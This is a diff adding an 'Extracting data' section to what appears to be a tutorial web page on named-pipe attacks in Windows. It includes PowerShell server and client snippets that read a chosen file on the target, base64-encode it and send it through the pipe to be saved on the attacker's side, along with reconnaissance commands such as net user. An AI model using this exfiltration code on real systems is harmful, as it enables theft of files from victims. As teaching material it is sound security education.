@@ -186,6 +186,60 @@
                                 <img src="img/namedpipe/command_exe.jpg" class="img-fluid" width="700">
                                 In this example, we ran "ipconfig" to get the ip address information. This also can be a potential "data exfiltration" incident since we could have navigated through different path "C:\Users\[Username]\Documents" or check mapped drives with "<strong>net use</strong>" or check local account "<strong>net user</strong>"...
                             </p>
+
+                            <h4 class="mb-0">Extracting data</h4>
+                            <p>
+                                We have seen previously that it is possible to send data through the pipe. Therefore, it is logical to be able to send a file through the pipe. <br>
+                                The functions needed to transfer data are : <br>
+                                <strong>
+                                <ul>
+                                    <li>[System.IO.File]::ReadAllBytes</li>
+                                    <li>[System.IO.File]::WriteAllBytes</li>
+                                    <li>[System.Convert]::ToBase64String</li>
+                                    <li>[System.Convert]::FromBase64String</li>
+                                    <li>[System.IO.StreamWriter]::WriteLine</li>
+                                    <li>[System.IO.StreamReader]::ReadLine</li>
+                                </ul>
+                                </strong>
+
+                                Since we can execute some commands, it is very easy to navigate to different directories and to print the current directory or the content of the directory. 
+
+                                <img src="img/namedpipe/extract_navigate.jpg" class="img-fluid" width="600">
+
+                                It remains to find a file that seems interesting to extract. Copy the full path of the interested file and paste it when selecting the option "Extract File".
+
+                                <img src="img/namedpipe/extract_file.jpg" class="img-fluid" width="800">
+
+                                The file will be extracted and in case that the target directory does not exist, the script will create a directory "FileExtractedFromPipe" to store the files that have been extracted from the pipe.
+
+                                <img src="img/namedpipe/extract_file_2.jpg" class="img-fluid" width="800">
+                                <img src="img/namedpipe/extract_file_3.jpg" class="img-fluid" width="800">
+
+                                <i style="color: red">Server code :</i> 
+                                <div class="squarebox">
+                                    $path = Read-Host "Path of the file to extract" <br>
+                                    $sw.WriteLine($path)
+                                </div>
+
+                                <i style="color: yellow">Client code :</i>
+                                <div class="squarebox">
+                                    $filepath = $sr.ReadLine()<br>
+                                    Write-Host "Copying file to host" <br>
+                                    $filebytes = [System.IO.File]::ReadAllBytes($filepath) <br>
+                                    $fileB64 = [System.Convert]::ToBase64String($filebytes) <br>
+                                    $sw.WriteLine($fileB64)
+                                </div>
+
+                                <i style="color: red">Server code :</i>
+                                <div class="squarebox">
+                                    $fileB64 = $sr.ReadLine() <br>
+                                    $filebytes = [System.Convert]::FromBase64String($fileb64) <br>
+                                    $filename = Split-Path $path -Leaf <br>
+                                    $path_to_copy = "C:\Users\Public\Temp" <br>
+                                    [System.IO.File]::WriteAllBytes($path_to_copy+"\"+$filename, $bytefile)
+                                </div>
+
+                            </p>
                             
                             <h4 class="mb-0">Remote Code Execution</h4>
                             <p>
